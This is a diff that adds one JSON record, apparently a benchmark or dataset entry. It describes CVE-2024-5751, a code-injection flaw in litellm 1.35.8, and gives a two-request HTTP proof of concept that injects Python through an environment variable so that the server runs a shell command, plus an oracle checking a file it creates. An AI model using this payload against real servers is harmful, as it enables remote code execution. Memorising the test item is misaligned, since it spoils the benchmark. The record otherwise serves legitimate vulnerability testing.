@@ -1,0 +1,15 @@
+{
+  "file_id": "74_litellm_huntr_ae623c2f-b64b-4245-9ed4-f13a0a5824ce",
+  "numeric_id": "74",
+  "library_hint": "litellm",
+  "source": "huntr",
+  "title": "Remote code execution due to unsafe use of eval in litellm when processing environment variables",
+  "cve": "CVE-2024-5751",
+  "cwe": "CWE-94: Code Injection",
+  "library": "litellm",
+  "affected_version": "== 1.35.8",
+  "vulnerable_function": "get_secret",
+  "triggerability": "indirect",
+  "trigger_payload": "POST /config/update HTTP/1.1\nHost: {BASE_URL}\nAccept: application/json\nAuthorization: Bearer sk-1234\nContent-Type: application/json\nContent-Length: 192\n{ \"environment_variables\": {\"PERPLEXITYAI_API_KEY\":\"__import__('os').system('touch /tmp/poc')\"} }\n\nPOST /model/new HTTP/1.1\nHost: {BASE_URL}\nContent-Length: 183\naccept: application/json\nContent-Type: application/json\nAuthorization: Bearer sk-1234\nConnection: close\n{ \"model_name\": \"DECODE\", \"litellm_params\": { \"model\": \"perplexity/fake\", \"tpm\" } }",
+  "oracle": "File created at /tmp/poc"
+}
